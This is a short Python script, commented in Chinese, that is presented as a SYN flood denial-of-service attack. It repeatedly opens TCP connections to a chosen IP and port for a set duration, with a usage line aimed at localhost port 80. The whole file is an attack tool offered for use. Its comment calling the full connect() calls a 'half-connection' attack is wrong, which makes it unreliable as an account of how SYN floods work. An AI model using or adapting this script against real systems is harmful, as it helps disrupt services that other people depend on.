import socket
import random
import time
from threading import Thread

def syn_flood(target_ip, target_port=80, duration=60):
    print(f"[+] 启动SYN Flood攻击 -> {target_ip}:{target_port}")
    for _ in range(duration * 1000):  # 持续duration秒
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))  # 半连接攻击
        except:
            pass
        time.sleep(0.001)  # 控制速率

# 用法
Thread(target=syn_flood, args=("127.0.0.1", 80, 60)).start()  # 目标IP, 端口, 持续时间(秒)
